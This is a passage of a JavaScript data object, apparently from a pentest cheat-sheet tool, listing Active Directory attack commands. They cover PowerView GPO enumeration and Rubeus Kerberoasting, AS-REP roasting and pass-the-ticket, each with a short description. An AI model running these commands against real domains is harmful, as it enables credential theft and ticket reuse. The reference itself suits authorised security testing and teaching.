                            description: "Find user accounts vulnerable to Kerberoasting"
                        },
                        {
                            name: "GPO Enumeration",
                            command: "Get-DomainGPO | Select-Object displayname,gpcfilesyspath",
                            description: "List Group Policy Objects in the domain"
                        }
                    ]
                },                {
                    name: "Rubeus",
                    description: "C# toolset for Kerberos interaction and abuse.",
                    toolType: "🔧 CLI Tool",
                    commands: [
                        {
                            name: "Kerberoasting",
                            command: "Rubeus.exe kerberoast",
                            description: "Extract service account TGS tickets for offline cracking"
                        },
                        {
                            name: "AS-REP Roasting",
                            command: "Rubeus.exe asreproast",
                            description: "Request encrypted AS-REP for accounts with pre-auth disabled"
                        },
                        {
                            name: "Pass the Ticket",
                            command: "Rubeus.exe ptt /ticket:ticket.kirbi",
                            description: "Import and apply a Kerberos ticket to current session"
                        }
                    ]
                }
            ]
        }
    ]
};
